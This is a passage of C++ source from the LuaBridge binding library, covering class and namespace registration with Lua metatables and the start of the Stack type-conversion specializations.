    assert (lua_isstring (L, lua_upvalueindex (1)));
    std::string s;

    // Get information on the caller's caller to format the message,
    // so the error appears to originate from the Lua source.
    lua_Debug ar;
    int result = lua_getstack (L, 2, &ar);
    if (result != 0)
    {
      lua_getinfo (L, "Sl", &ar);
      s = ar.short_src;
      if (ar.currentline != -1)
      {
        // poor mans int to string to avoid <strstrream>.
        lua_pushnumber (L, ar.currentline);
        s = s + ":" + lua_tostring (L, -1) + ": ";
        lua_pop (L, 1);
      }
    }

    s = s + message;

    return luaL_error (L, s.c_str ());
  }
#endif

  //----------------------------------------------------------------------------
  /**
    Pop the Lua stack.
  */
  void pop (int n) const
  {
    if (m_stackSize >= n && lua_gettop (L) >= n)
    {
      lua_pop (L, n);
      m_stackSize -= n;
    }
    else
    {
      throw std::logic_error ("invalid stack");
    }
  }

private:
  /**
    Factored base to reduce template instantiations.
  */
  class ClassBase
  {
  private:
    ClassBase& operator= (ClassBase const& other);

  protected:
    friend class Namespace;

    lua_State* const L;
    int mutable m_stackSize;

  protected:
    //--------------------------------------------------------------------------
    /**
      __index metamethod for a class.

      This implements member functions, data members, and property members.
      Functions are stored in the metatable and const metatable. Data members
      and property members are in the __propget table.

      If the key is not found, the search proceeds up the hierarchy of base
      classes.
    */
    static int indexMetaMethod (lua_State* L)
    {
      int result = 0;

      assert (lua_isuserdata (L, 1));               // warn on security bypass
      lua_getmetatable (L, 1);                      // get metatable for object
      for (;;)
      {
        lua_pushvalue (L, 2);                       // push key arg2
        lua_rawget (L, -2);                         // lookup key in metatable
        if (lua_iscfunction (L, -1))                // ensure its a cfunction
        {
          lua_remove (L, -2);                       // remove metatable
          result = 1;
          break;
        }
        else if (lua_isnil (L, -1))
        {
          lua_pop (L, 1);
        }
        else
        {
          lua_pop (L, 2);
          throw std::logic_error ("not a cfunction");
        }

        rawgetfield (L, -1, "__propget");           // get __propget table
        if (lua_istable (L, -1))                    // ensure it is a table
        {
          lua_pushvalue (L, 2);                     // push key arg2
          lua_rawget (L, -2);                       // lookup key in __propget
          lua_remove (L, -2);                       // remove __propget
          if (lua_iscfunction (L, -1))              // ensure its a cfunction
          {
            lua_remove (L, -2);                     // remove metatable
            lua_pushvalue (L, 1);                   // push class arg1
            lua_call (L, 1, 1);
            result = 1;
            break;
          }
          else if (lua_isnil (L, -1))
          {
            lua_pop (L, 1);
          }
          else
          {
            lua_pop (L, 2);

            // We only put cfunctions into __propget.
            throw std::logic_error ("not a cfunction");
          }
        }
        else
        {
          lua_pop (L, 2);

          // __propget is missing, or not a table.
          throw std::logic_error ("missing __propget table");
        }

        // Repeat the lookup in the __parent metafield,
        // or return nil if the field doesn't exist.
        rawgetfield (L, -1, "__parent");
        if (lua_istable (L, -1))
        {
          // Remove metatable and repeat the search in __parent.
          lua_remove (L, -2);
        }
        else if (lua_isnil (L, -1))
        {
          result = 1;
          break;
        }
        else
        {
          lua_pop (L, 2);

          throw std::logic_error ("__parent is not a table");
        }
      }

      return result;
    }

    //--------------------------------------------------------------------------
    /**
      __newindex metamethod for classes.

      This supports writable variables and properties on class objects. The
      corresponding object is passed in the first parameter to the set function.
    */
    static int newindexMetaMethod (lua_State* L)
    {
      int result = 0;

      lua_getmetatable (L, 1);

      for (;;)
      {
        // Check __propset
        rawgetfield (L, -1, "__propset");
        if (!lua_isnil (L, -1))
        {
          lua_pushvalue (L, 2);
          lua_rawget (L, -2);
          if (!lua_isnil (L, -1))
          {
            // found it, call the setFunction.
            assert (lua_isfunction (L, -1));
            lua_pushvalue (L, 1);
            lua_pushvalue (L, 3);
            lua_call (L, 2, 0);
            result = 0;
            break;
          }
          lua_pop (L, 1);
        }
        lua_pop (L, 1);

        // Repeat the lookup in the __parent metafield.
        rawgetfield (L, -1, "__parent");
        if (lua_isnil (L, -1))
        {
          // Either the property or __parent must exist.
          result = luaL_error (L,
            "no member named '%s'", lua_tostring (L, 2));
        }
        lua_remove (L, -2);
      }

      return result;
    }

    //--------------------------------------------------------------------------
    /**
      Create the const table.
    */
    void createConstTable (char const* name)
    {
      lua_newtable (L);
      lua_pushvalue (L, -1);
      lua_setmetatable (L, -2);
      lua_pushboolean (L, 1);
      lua_rawsetp (L, -2, getIdentityKey ());
      lua_pushstring (L, (std::string ("const ") + name).c_str ());
      rawsetfield (L, -2, "__type");
      lua_pushcfunction (L, &indexMetaMethod);
      rawsetfield (L, -2, "__index");
      lua_pushcfunction (L, &newindexMetaMethod);
      rawsetfield (L, -2, "__newindex");
      lua_newtable (L);
      rawsetfield (L, -2, "__propget");
      
      if (Security::hideMetatables ())
      {
        lua_pushnil (L);
        rawsetfield (L, -2, "__metatable");
      }
    }

    //--------------------------------------------------------------------------
    /**
      Create the class table.

      The Lua stack should have the const table on top.
    */
    void createClassTable (char const* name)
    {
      lua_newtable (L);
      lua_pushvalue (L, -1);
      lua_setmetatable (L, -2);
      lua_pushboolean (L, 1);
      lua_rawsetp (L, -2, getIdentityKey ());
      lua_pushstring (L, name);
      rawsetfield (L, -2, "__type");
      lua_pushcfunction (L, &indexMetaMethod);
      rawsetfield (L, -2, "__index");
      lua_pushcfunction (L, &newindexMetaMethod);
      rawsetfield (L, -2, "__newindex");
      lua_newtable (L);
      rawsetfield (L, -2, "__propget");
      lua_newtable (L);
      rawsetfield (L, -2, "__propset");

      lua_pushvalue (L, -2);
      rawsetfield (L, -2, "__const"); // point to const table

      lua_pushvalue (L, -1);
      rawsetfield (L, -3, "__class"); // point const table to class table

      if (Security::hideMetatables ())
      {
        lua_pushnil (L);
        rawsetfield (L, -2, "__metatable");
      }
    }

    //--------------------------------------------------------------------------
    /**
      Create the static table.

      The Lua stack should have:
        -1 class table
        -2 const table
        -3 enclosing namespace
    */
    void createStaticTable (char const* name)
    {
      lua_newtable (L);
      lua_newtable (L);
      lua_pushvalue (L, -1);
      lua_setmetatable (L, -3);
      lua_insert (L, -2);
      rawsetfield (L, -5, name);

#if 0
      lua_pushlightuserdata (L, this);
      lua_pushcclosure (L, &tostringMetaMethod, 1);
      rawsetfield (L, -2, "__tostring");
#endif
      lua_pushcfunction (L, &CFunc::indexMetaMethod);
      rawsetfield (L, -2, "__index");
      lua_pushcfunction (L, &CFunc::newindexMetaMethod);
      rawsetfield (L, -2, "__newindex");
      lua_newtable (L);
      rawsetfield (L, -2, "__propget");
      lua_newtable (L);
      rawsetfield (L, -2, "__propset");

      lua_pushvalue (L, -2);
      rawsetfield (L, -2, "__class"); // point to class table

      if (Security::hideMetatables ())
      {
        lua_pushnil (L);
        rawsetfield (L, -2, "__metatable");
      }
    }

    //==========================================================================
    /**
      lua_CFunction to construct a class object wrapped in a container.
    */
    template <class Params, class C>
    static int ctorContainerProxy (lua_State* L)
    {
      typedef typename ContainerTraits <C>::Type T;
      ArgList <Params, 2> args (L);
      T* const p = Constructor <T, Params>::call (args);
      UserdataSharedHelper <C, false>::push (L, p);
      return 1;
    }

    //--------------------------------------------------------------------------
    /**
      lua_CFunction to construct a class object in-place in the userdata.
    */
    template <class Params, class T>
    static int ctorPlacementProxy (lua_State* L)
    {
      ArgList <Params, 2> args (L);
      Constructor <T, Params>::call (UserdataValue <T>::place (L), args);
      return 1;
    }

    //--------------------------------------------------------------------------
    /**
      Pop the Lua stack.
    */
    void pop (int n) const
    {
      if (m_stackSize >= n && lua_gettop (L) >= n)
      {
        lua_pop (L, n);
        m_stackSize -= n;
      }
      else
      {
        throw std::logic_error ("invalid stack");
      }
    }

  public:
    //--------------------------------------------------------------------------
    explicit ClassBase (lua_State* L_)
      : L (L_)
      , m_stackSize (0)
    {
    }

    //--------------------------------------------------------------------------
    /**
      Copy Constructor.
    */
    ClassBase (ClassBase const& other)
      : L (other.L)
      , m_stackSize (0)
    {
      m_stackSize = other.m_stackSize;
      other.m_stackSize = 0;
    }

    ~ClassBase ()
    {
      pop (m_stackSize);
    }
  };

  //============================================================================
  //
  // Class
  //
  //============================================================================
  /**
    Provides a class registration in a lua_State.

    After contstruction the Lua stack holds these objects:
      -1 static table
      -2 class table
      -3 const table
      -4 (enclosing namespace)
  */
  template <class T>
  class Class : public ClassBase
  {
  public:
    //==========================================================================
    /**
      Register a new class or add to an existing class registration.
    */
    Class (char const* name, Namespace const* parent) : ClassBase (parent->L)
    {
      m_stackSize = parent->m_stackSize + 3;
      parent->m_stackSize = 0;

      assert (lua_istable (L, -1));
      rawgetfield (L, -1, name);
      
      if (lua_isnil (L, -1))
      {
        lua_pop (L, 1);

        createConstTable (name);
        lua_pushcfunction (L, &CFunc::gcMetaMethod <T>);
        rawsetfield (L, -2, "__gc");

        createClassTable (name);
        lua_pushcfunction (L, &CFunc::gcMetaMethod <T>);
        rawsetfield (L, -2, "__gc");

        createStaticTable (name);

        // Map T back to its tables.
        lua_pushvalue (L, -1);
        lua_rawsetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getStaticKey ());
        lua_pushvalue (L, -2);
        lua_rawsetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getClassKey ());
        lua_pushvalue (L, -3);
        lua_rawsetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getConstKey ());
      }
      else
      {
        rawgetfield (L, -1, "__class");
        rawgetfield (L, -1, "__const");

        // Reverse the top 3 stack elements
        lua_insert (L, -3);
        lua_insert (L, -2);
      }
    }

    //==========================================================================
    /**
      Derive a new class.
    */
    Class (char const* name, Namespace const* parent, void const* const staticKey)
      : ClassBase (parent->L)
    {
      m_stackSize = parent->m_stackSize + 3;
      parent->m_stackSize = 0;

      assert (lua_istable (L, -1));

      createConstTable (name);
      lua_pushcfunction (L, &CFunc::gcMetaMethod <T>);
      rawsetfield (L, -2, "__gc");

      createClassTable (name);
      lua_pushcfunction (L, &CFunc::gcMetaMethod <T>);
      rawsetfield (L, -2, "__gc");

      createStaticTable (name);

      lua_rawgetp (L, LUA_REGISTRYINDEX, staticKey);
      assert (lua_istable (L, -1));
      rawgetfield (L, -1, "__class");
      assert (lua_istable (L, -1));
      rawgetfield (L, -1, "__const");
      assert (lua_istable (L, -1));

      rawsetfield (L, -6, "__parent");
      rawsetfield (L, -4, "__parent");
      rawsetfield (L, -2, "__parent");

      lua_pushvalue (L, -1);
      lua_rawsetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getStaticKey ());
      lua_pushvalue (L, -2);
      lua_rawsetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getClassKey ());
      lua_pushvalue (L, -3);
      lua_rawsetp (L, LUA_REGISTRYINDEX, ClassInfo <T>::getConstKey ());
    }

    //--------------------------------------------------------------------------
    /**
      Continue registration in the enclosing namespace.
    */
    Namespace endClass ()
    {
      return Namespace (this);
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a static data member.
    */
    template <class U>
    Class <T>& addStaticData (char const* name, U* pu, bool isWritable = true)
    {
      assert (lua_istable (L, -1));

      rawgetfield (L, -1, "__propget");
      assert (lua_istable (L, -1));
      lua_pushlightuserdata (L, pu);
      lua_pushcclosure (L, &CFunc::getVariable <U>, 1);
      rawsetfield (L, -2, name);
      lua_pop (L, 1);

      rawgetfield (L, -1, "__propset");
      assert (lua_istable (L, -1));
      if (isWritable)
      {
        lua_pushlightuserdata (L, pu);
        lua_pushcclosure (L, &CFunc::setVariable <U>, 1);
      }
      else
      {
        lua_pushstring (L, name);
        lua_pushcclosure (L, &CFunc::readOnlyError, 1);
      }
      rawsetfield (L, -2, name);
      lua_pop (L, 1);

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a static property member.

      If the set function is null, the property is read-only.
    */
    template <class U>
    Class <T>& addStaticProperty (char const* name, U (*get)(), void (*set)(U) = 0)
    {
      typedef U (*get_t)();
      typedef void (*set_t)(U);
      
      assert (lua_istable (L, -1));

      rawgetfield (L, -1, "__propget");
      assert (lua_istable (L, -1));
      new (lua_newuserdata (L, sizeof (get))) get_t (get);
      lua_pushcclosure (L, &CFunc::Call <U (*) (void)>::f, 1);
      rawsetfield (L, -2, name);
      lua_pop (L, 1);

      rawgetfield (L, -1, "__propset");
      assert (lua_istable (L, -1));
      if (set != 0)
      {
        new (lua_newuserdata (L, sizeof (set))) set_t (set);
        lua_pushcclosure (L, &CFunc::Call <void (*) (U)>::f, 1);
      }
      else
      {
        lua_pushstring (L, name);
        lua_pushcclosure (L, &CFunc::readOnlyError, 1);
      }
      rawsetfield (L, -2, name);
      lua_pop (L, 1);

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a static member function.
    */
    template <class FP>
    Class <T>& addStaticFunction (char const* name, FP const fp)
    {
      new (lua_newuserdata (L, sizeof (fp))) FP (fp);
      lua_pushcclosure (L, &CFunc::Call <FP>::f, 1);
      rawsetfield (L, -2, name);

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a lua_CFunction.
    */
    Class <T>& addStaticCFunction (char const* name, int (*const fp)(lua_State*))
    {
      lua_pushcfunction (L, fp);
      rawsetfield (L, -2, name);
      return *this;
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a data member.
    */
    template <class U>
    Class <T>& addData (char const* name, const U T::* mp, bool isWritable = true)
    {
      typedef const U T::*mp_t;

      // Add to __propget in class and const tables.
      {
        rawgetfield (L, -2, "__propget");
        rawgetfield (L, -4, "__propget");
        new (lua_newuserdata (L, sizeof (mp_t))) mp_t (mp);
        lua_pushcclosure (L, &CFunc::getProperty <T,U>, 1);
        lua_pushvalue (L, -1);
        rawsetfield (L, -4, name);
        rawsetfield (L, -2, name);
        lua_pop (L, 2);
      }

      if (isWritable)
      {
        // Add to __propset in class table.
        rawgetfield (L, -2, "__propset");
        assert (lua_istable (L, -1));
        new (lua_newuserdata (L, sizeof (mp_t))) mp_t (mp);
        lua_pushcclosure (L, &CFunc::setProperty <T,U>, 1);
        rawsetfield (L, -2, name);
        lua_pop (L, 1);
      }

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a property member.
    */
    template <class TG, class TS>
    Class <T>& addProperty (char const* name, TG (T::* get) () const, void (T::* set) (TS))
    {
      // Add to __propget in class and const tables.
      {
        rawgetfield (L, -2, "__propget");
        rawgetfield (L, -4, "__propget");
        typedef TG (T::*get_t) () const;
        new (lua_newuserdata (L, sizeof (get_t))) get_t (get);
        lua_pushcclosure (L, &CFunc::CallConstMember <get_t>::f, 1);
        lua_pushvalue (L, -1);
        rawsetfield (L, -4, name);
        rawsetfield (L, -2, name);
        lua_pop (L, 2);
      }

      {
        // Add to __propset in class table.
        rawgetfield (L, -2, "__propset");
        assert (lua_istable (L, -1));
        typedef void (T::* set_t) (TS);
        new (lua_newuserdata (L, sizeof (set_t))) set_t (set);
        lua_pushcclosure (L, &CFunc::CallMember <set_t>::f, 1);
        rawsetfield (L, -2, name);
        lua_pop (L, 1);
      }

      return *this;
    }

    // read-only
    template <class TG>
    Class <T>& addProperty (char const* name, TG (T::* get) () const)
    {
      // Add to __propget in class and const tables.
      rawgetfield (L, -2, "__propget");
      rawgetfield (L, -4, "__propget");
      typedef TG (T::*get_t) () const;
      new (lua_newuserdata (L, sizeof (get_t))) get_t (get);
      lua_pushcclosure (L, &CFunc::CallConstMember <get_t>::f, 1);
      lua_pushvalue (L, -1);
      rawsetfield (L, -4, name);
      rawsetfield (L, -2, name);
      lua_pop (L, 2);

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a property member, by proxy.

      When a class is closed for modification and does not provide (or cannot
      provide) the function signatures necessary to implement get or set for
      a property, this will allow non-member functions act as proxies.

      Both the get and the set functions require a T const* and T* in the first
      argument respectively.
    */
    template <class TG, class TS>
    Class <T>& addProperty (char const* name, TG (*get) (T const*), void (*set) (T*, TS))
    {
      // Add to __propget in class and const tables.
      {
        rawgetfield (L, -2, "__propget");
        rawgetfield (L, -4, "__propget");
        typedef TG (*get_t) (T const*);
        new (lua_newuserdata (L, sizeof (get_t))) get_t (get);
        lua_pushcclosure (L, &CFunc::Call <get_t>::f, 1);
        lua_pushvalue (L, -1);
        rawsetfield (L, -4, name);
        rawsetfield (L, -2, name);
        lua_pop (L, 2);
      }

      if (set != 0)
      {
        // Add to __propset in class table.
        rawgetfield (L, -2, "__propset");
        assert (lua_istable (L, -1));
        typedef void (*set_t) (T*, TS);
        new (lua_newuserdata (L, sizeof (set_t))) set_t (set);
        lua_pushcclosure (L, &CFunc::Call <set_t>::f, 1);
        rawsetfield (L, -2, name);
        lua_pop (L, 1);
      }

      return *this;
    }

    // read-only
    template <class TG, class TS>
    Class <T>& addProperty (char const* name, TG (*get) (T const*))
    {
      // Add to __propget in class and const tables.
      rawgetfield (L, -2, "__propget");
      rawgetfield (L, -4, "__propget");
      typedef TG (*get_t) (T const*);
      new (lua_newuserdata (L, sizeof (get_t))) get_t (get);
      lua_pushcclosure (L, &CFunc::Call <get_t>::f, 1);
      lua_pushvalue (L, -1);
      rawsetfield (L, -4, name);
      rawsetfield (L, -2, name);
      lua_pop (L, 2);

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
        Add or replace a member function.
    */
    template <class MemFn>
    Class <T>& addFunction (char const* name, MemFn mf)
    {
      CFunc::CallMemberFunctionHelper <MemFn, FuncTraits <MemFn>::isConstMemberFunction>::add (L, name, mf);
      return *this;
    }

    //--------------------------------------------------------------------------
    /**
        Add or replace a member lua_CFunction.
    */
    Class <T>& addCFunction (char const* name, int (T::*mfp)(lua_State*))
    {
      typedef int (T::*MFP)(lua_State*);
      assert (lua_istable (L, -1));
      new (lua_newuserdata (L, sizeof (mfp))) MFP (mfp);
      lua_pushcclosure (L, &CFunc::CallMemberCFunction <T>::f, 1);
      rawsetfield (L, -3, name); // class table

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
        Add or replace a const member lua_CFunction.
    */
    Class <T>& addCFunction (char const* name, int (T::*mfp)(lua_State*) const)
    {
      typedef int (T::*MFP)(lua_State*) const;
      assert (lua_istable (L, -1));
      new (lua_newuserdata (L, sizeof (mfp))) MFP (mfp);
      lua_pushcclosure (L, &CFunc::CallConstMemberCFunction <T>::f, 1);
      lua_pushvalue (L, -1);
      rawsetfield (L, -5, name); // const table
      rawsetfield (L, -3, name); // class table

      return *this;
    }

    //--------------------------------------------------------------------------
    /**
      Add or replace a primary Constructor.

      The primary Constructor is invoked when calling the class type table
      like a function.

      The template parameter should be a function pointer type that matches
      the desired Constructor (since you can't take the address of a Constructor
      and pass it as an argument).
    */
    template <class MemFn, class C>
    Class <T>& addConstructor ()
    {
      lua_pushcclosure (L,
        &ctorContainerProxy <typename FuncTraits <MemFn>::Params, C>, 0);
      rawsetfield(L, -2, "__call");

      return *this;
    }

    template <class MemFn>
    Class <T>& addConstructor ()
    {
      lua_pushcclosure (L,
        &ctorPlacementProxy <typename FuncTraits <MemFn>::Params, T>, 0);
      rawsetfield(L, -2, "__call");

      return *this;
    }
  };

private:
  //----------------------------------------------------------------------------
  /**
      Open the global namespace for registrations.
  */
  explicit Namespace (lua_State* L_)
    : L (L_)
    , m_stackSize (0)
  {
    lua_getglobal (L, "_G");
    ++m_stackSize;
  }

  //----------------------------------------------------------------------------
  /**
      Open a namespace for registrations.

      The namespace is created if it doesn't already exist.
      The parent namespace is at the top of the Lua stack.
  */
  Namespace (char const* name, Namespace const* parent)
    : L (parent->L)
    , m_stackSize (0)
  {
    m_stackSize = parent->m_stackSize + 1;
    parent->m_stackSize = 0;

    assert (lua_istable (L, -1));
    rawgetfield (L, -1, name);
    if (lua_isnil (L, -1))
    {
      lua_pop (L, 1);

      lua_newtable (L);
      lua_pushvalue (L, -1);
      lua_setmetatable (L, -2);
      lua_pushcfunction (L, &CFunc::indexMetaMethod);
      rawsetfield (L, -2, "__index");
      lua_pushcfunction (L, &CFunc::newindexMetaMethod);
      rawsetfield (L, -2, "__newindex");
      lua_newtable (L);
      rawsetfield (L, -2, "__propget");
      lua_newtable (L);
      rawsetfield (L, -2, "__propset");
      lua_pushvalue (L, -1);
      rawsetfield (L, -3, name);
#if 0
      lua_pushcfunction (L, &tostringMetaMethod);
      rawsetfield (L, -2, "__tostring");
#endif
    }
  }

  //----------------------------------------------------------------------------
  /**
      Creates a continued registration from a child namespace.
  */
  explicit Namespace (Namespace const* child)
    : L (child->L)
    , m_stackSize (0)
  {
    m_stackSize = child->m_stackSize - 1;
    child->m_stackSize = 1;
    child->pop (1);

    // It is not necessary or valid to call
    // endNamespace() for the global namespace!
    //
    assert (m_stackSize != 0);
  }

  //----------------------------------------------------------------------------
  /**
      Creates a continued registration from a child class.
  */
  explicit Namespace (ClassBase const* child)
    : L (child->L)
    , m_stackSize (0)
  {
    m_stackSize = child->m_stackSize - 3;
    child->m_stackSize = 3;
    child->pop (3);
  }

public:
  //----------------------------------------------------------------------------
  /**
      Copy Constructor.

      Ownership of the stack is transferred to the new object. This happens
      when the compiler emits temporaries to hold these objects while chaining
      registrations across namespaces.
  */
  Namespace (Namespace const& other) : L (other.L)
  {
    m_stackSize = other.m_stackSize;
    other.m_stackSize = 0;
  }

  //----------------------------------------------------------------------------
  /**
      Closes this namespace registration.
  */
  ~Namespace ()
  {
    pop (m_stackSize);
  }

  //----------------------------------------------------------------------------
  /**
      Open the global namespace.
  */
  static Namespace getGlobalNamespace (lua_State* L)
  {
    return Namespace (L);
  }

  //----------------------------------------------------------------------------
  /**
      Open a new or existing namespace for registrations.
  */
  Namespace beginNamespace (char const* name)
  {
    return Namespace (name, this);
  }

  //----------------------------------------------------------------------------
  /**
      Continue namespace registration in the parent.

      Do not use this on the global namespace.
  */
  Namespace endNamespace ()
  {
    return Namespace (this);
  }

  //----------------------------------------------------------------------------
  /**
      Add or replace a variable.
  */
  template <class T>
  Namespace& addVariable (char const* name, T* pt, bool isWritable = true)
  {
    assert (lua_istable (L, -1));

    rawgetfield (L, -1, "__propget");
    assert (lua_istable (L, -1));
    lua_pushlightuserdata (L, pt);
    lua_pushcclosure (L, &CFunc::getVariable <T>, 1);
    rawsetfield (L, -2, name);
    lua_pop (L, 1);

    rawgetfield (L, -1, "__propset");
    assert (lua_istable (L, -1));
    if (isWritable)
    {
      lua_pushlightuserdata (L, pt);
      lua_pushcclosure (L, &CFunc::setVariable <T>, 1);
    }
    else
    {
      lua_pushstring (L, name);
      lua_pushcclosure (L, &CFunc::readOnlyError, 1);
    }
    rawsetfield (L, -2, name);
    lua_pop (L, 1);

    return *this;
  }
  
  //----------------------------------------------------------------------------
  /**
      Add or replace a property.

      If the set function is omitted or null, the property is read-only.
  */
  template <class TG, class TS>
  Namespace& addProperty (char const* name, TG (*get) (), void (*set)(TS) = 0)
  {
    assert (lua_istable (L, -1));

    rawgetfield (L, -1, "__propget");
    assert (lua_istable (L, -1));
    typedef TG (*get_t) ();
    new (lua_newuserdata (L, sizeof (get_t))) get_t (get);
    lua_pushcclosure (L, &CFunc::Call <TG (*) (void)>::f, 1);
    rawsetfield (L, -2, name);
    lua_pop (L, 1);

    rawgetfield (L, -1, "__propset");
    assert (lua_istable (L, -1));
    if (set != 0)
    {
      typedef void (*set_t) (TS);
      new (lua_newuserdata (L, sizeof (set_t))) set_t (set);
      lua_pushcclosure (L, &CFunc::Call <void (*) (TS)>::f, 1);
    }
    else
    {
      lua_pushstring (L, name);
      lua_pushcclosure (L, &CFunc::readOnlyError, 1);
    }
    rawsetfield (L, -2, name);
    lua_pop (L, 1);

    return *this;
  }

  //----------------------------------------------------------------------------
  /**
      Add or replace a free function.
  */
  template <class FP>
  Namespace& addFunction (char const* name, FP const fp)
  {
    assert (lua_istable (L, -1));

    new (lua_newuserdata (L, sizeof (fp))) FP (fp);
    lua_pushcclosure (L, &CFunc::Call <FP>::f, 1);
    rawsetfield (L, -2, name);

    return *this;
  }

  //----------------------------------------------------------------------------
  /**
      Add or replace a lua_CFunction.
  */
  Namespace& addCFunction (char const* name, int (*const fp)(lua_State*))
  {
    lua_pushcfunction (L, fp);
    rawsetfield (L, -2, name);

    return *this;
  }

  //----------------------------------------------------------------------------
  /**
      Open a new or existing class for registrations.
  */
  template <class T>
  Class <T> beginClass (char const* name)
  {
    return Class <T> (name, this);
  }

  //----------------------------------------------------------------------------
  /**
      Derive a new class for registrations.

      To continue registrations for the class later, use beginClass().
      Do not call deriveClass() again.
  */
  template <class T, class U>
  Class <T> deriveClass (char const* name)
  {
    return Class <T> (name, this, ClassInfo <U>::getStaticKey ());
  }
};

//------------------------------------------------------------------------------
/**
    Retrieve the global namespace.

    It is recommended to put your namespace inside the global namespace, and
    then add your classes and functions to it, rather than adding many classes
    and functions directly to the global namespace.
*/
inline Namespace getGlobalNamespace (lua_State* L)
{
  return Namespace::getGlobalNamespace (L);
}

```

`libs/LuaBridge/detail/Stack.h`:

```h
//------------------------------------------------------------------------------
/*
  https://github.com/vinniefalco/LuaBridge

  Copyright 2012, Vinnie Falco <vinnie.falco@gmail.com>
  Copyright 2007, Nathan Reed

  License: The MIT License (http://www.opensource.org/licenses/mit-license.php)

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:

  The above copyright notice and this permission notice shall be included in all
  copies or substantial portions of the Software.

  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  SOFTWARE.
*/
//==============================================================================

//------------------------------------------------------------------------------
/**
    Receive the lua_State* as an argument.
*/
template <>
struct Stack <lua_State*>
{
  static lua_State* get (lua_State* L, int)
  {
    return L;
  }
};

//------------------------------------------------------------------------------
/**
    Push a lua_CFunction.
*/
template <>
struct Stack <lua_CFunction>
{
  static void push (lua_State* L, lua_CFunction f)
  {
    lua_pushcfunction (L, f);
  }

  static lua_CFunction get (lua_State* L, int index)
  {
    return lua_tocfunction (L, index);
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `int`.
*/
template <>
struct Stack <int>
{
  static inline void push (lua_State* L, int value)
  {
    lua_pushinteger (L, static_cast <lua_Integer> (value));
  }
  
  static inline int get (lua_State* L, int index)
  {
    return static_cast <int> (luaL_checkinteger (L, index));
  }
};

template <>
struct Stack <int const&>
{
  static inline void push (lua_State* L, int value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline int get (lua_State* L, int index)
  {
    return static_cast <int > (luaL_checknumber (L, index));
  }
};
//------------------------------------------------------------------------------
/**
    Stack specialization for `unsigned int`.
*/
template <>
struct Stack <unsigned int>
{
  static inline void push (lua_State* L, unsigned int value)
  {
    lua_pushinteger (L, static_cast <lua_Integer> (value));
  }
  
  static inline unsigned int get (lua_State* L, int index)
  {
    return static_cast <unsigned int> (luaL_checkinteger (L, index));
  }
};

template <>
struct Stack <unsigned int const&>
{
  static inline void push (lua_State* L, unsigned int value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline unsigned int get (lua_State* L, int index)
  {
    return static_cast <unsigned int > (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `unsigned char`.
*/
template <>
struct Stack <unsigned char>
{
  static inline void push (lua_State* L, unsigned char value)
  {
    lua_pushinteger (L, static_cast <lua_Integer> (value));
  }
  
  static inline unsigned char get (lua_State* L, int index)
  {
    return static_cast <unsigned char> (luaL_checkinteger (L, index));
  }
};

template <>
struct Stack <unsigned char const&>
{
  static inline void push (lua_State* L, unsigned char value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline unsigned char get (lua_State* L, int index)
  {
    return static_cast <unsigned char> (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `short`.
*/
template <>
struct Stack <short>
{
  static inline void push (lua_State* L, short value)
  {
    lua_pushinteger (L, static_cast <lua_Integer> (value));
  }
  
  static inline short get (lua_State* L, int index)
  {
    return static_cast <short> (luaL_checkinteger (L, index));
  }
};

template <>
struct Stack <short const&>
{
  static inline void push (lua_State* L, short value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline short get (lua_State* L, int index)
  {
    return static_cast <short> (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `unsigned short`.
*/
template <>
struct Stack <unsigned short>
{
  static inline void push (lua_State* L, unsigned short value)
  {
    lua_pushinteger (L, static_cast <lua_Integer> (value));
  }
  
  static inline unsigned short get (lua_State* L, int index)
  {
    return static_cast <unsigned short> (luaL_checkinteger (L, index));
  }
};

template <>
struct Stack <unsigned short const&>
{
  static inline void push (lua_State* L, unsigned short value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline unsigned short get (lua_State* L, int index)
  {
    return static_cast <unsigned short> (luaL_checknumber (L, index));
  }
};

//------------------------------------------------------------------------------
/**
    Stack specialization for `long`.
*/
template <>
struct Stack <long>
{
  static inline void push (lua_State* L, long value)
  {
    lua_pushinteger (L, static_cast <lua_Integer> (value));
  }
  
  static inline long get (lua_State* L, int index)
  {
    return static_cast <long> (luaL_checkinteger (L, index));
  }
};

template <>
struct Stack <long const&>
{
  static inline void push (lua_State* L, long value)
  {
    lua_pushnumber (L, static_cast <lua_Number> (value));
  }
  
  static inline long get (lua_State* L, int index)
  {
